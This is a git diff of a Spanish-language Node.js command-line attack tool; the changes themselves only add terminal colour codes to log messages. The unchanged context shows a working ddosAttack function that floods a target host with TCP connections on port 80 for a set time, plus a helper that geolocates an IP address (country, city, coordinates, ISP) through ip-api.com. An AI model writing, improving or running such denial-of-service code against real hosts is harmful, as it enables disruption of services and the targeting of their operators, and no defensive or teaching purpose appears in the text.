@@ -68,15 +68,15 @@ let attackDuration = 60; // Duración del ataque por defecto
 
 const ddosAttack = async (url, numConnections, attackDuration) => {
 try {
-console.log(`[36m Iniciando ataque DDoS...`);
+console.log(`[36m Iniciando ataque DDoS...`);
 const sockets = [];
 for (let i = 0; i < numConnections; i++) {
 const socket = new net.Socket();
 socket.connect(80, url, () => {
-console.log(`[31m Conectado a ${url}`);
+console.log(`[31m Conectado a ${url}`);
 });
 socket.on('data', (data) => {
-console.log(`Dato recibido de ${url}`);
+console.log(`[33m Dato recibido de ${url}`);
 });
 socket.on('error', (err) => {
 console.error(`Error: ${err}`);
@@ -85,7 +85,7 @@ sockets.push(socket);
 }
 
 setTimeout(() => {
-console.log('Ataque finalizado');
+console.log('[32mAtaque finalizado');
 sockets.forEach((socket) => socket.destroy());
 }, attackDuration * 1000);
 } catch (error) {
@@ -95,13 +95,13 @@ console.error(`Error: ${error}`);
 
 const updateCode = async () => {
 try {
-console.log(`[36m Actualizando código...`);
+console.log(`[36m Actualizando código...`);
 const exec = require('child_process').exec;
 exec('git pull origin main', (error, stdout, stderr) => {
 if (error) {
 console.error(`Error: ${error}`);
 } else {
-console.log(`[36m Código actualizado correctamente!`);
+console.log(`[32m Código actualizado correctamente!`);
 }
 });
 } catch (error) {
@@ -173,21 +173,20 @@ const getGeoIP = async (ip) => {
 try {
 const response = await axios.get(`http://ip-api.com/json/${ip}`);
 const data = response.data;
-console.log(`País: ${data.country}`);
-console.log(`Código del país: ${data.countryCode}`);
-console.log(`Región: ${data.region}`);
-console.log(`Código de la región: ${data.regionCode}`);
-console.log(`Ciudad: ${data.city}`);
-console.log(`Latitude: ${data.lat}`);
-console.log(`Longitude: ${data.lon}`);
-console.log(`ISP: ${data.isp}`);
-console.log(`Organización: ${data.org}`);
-console.log(`Zona horaria: ${data.timezone}`);
+console.log(`[31m País: ${data.country}`);
+console.log(`[31m Código del país: ${data.countryCode}`);
+console.log(`[31m Región: ${data.region}`);
+console.log(`[31m Código de la región: ${data.regionCode}`);
+console.log(`[31m Ciudad: ${data.city}`);
+console.log(`[31m Latitude: ${data.lat}`);
+console.log(`[31m Longitude: ${data.lon}`);
+console.log(`[31m ISP: ${data.isp}`);
+console.log(`[31m Organización: ${data.org}`);
+console.log(`[31m Zona horaria: ${data.timezone}`);
 } catch (error) {
 console.error(`Error: ${error.message}`);
 }
 };
-
 
 
 rl.on('line', (option) => {
